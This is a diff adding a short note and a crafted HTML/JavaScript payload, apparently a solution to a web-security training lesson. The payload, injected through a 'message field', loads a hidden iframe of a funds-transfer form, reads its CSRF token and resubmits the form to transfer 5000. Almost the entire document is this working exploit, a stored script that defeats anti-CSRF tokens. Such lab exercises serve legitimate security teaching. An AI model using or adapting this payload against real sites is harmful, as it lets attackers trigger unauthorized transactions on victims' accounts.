@@ -1,0 +1,11 @@
+The message field is exploitable. The following is the exploit I crafted. 
+
+<iframe id="scrfFrame" src="attack?Screen=275&menu=900&transferFunds=main" onload="callTokenFunc()"></iframe>
+<script>
+function callTokenFunc() {
+	var iframe = document.getElementById('scrfFrame');
+	var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+	document.getElementById('scrfFrame').src = 'attack?Screen=275&menu=900&transferFunds=5000&CSRFToken=' + innerDoc.getElementsByTagName("form")[0].CSRFToken.value;
+	document.getElementById('scrfFrame').onload = "";
+}
+</script>
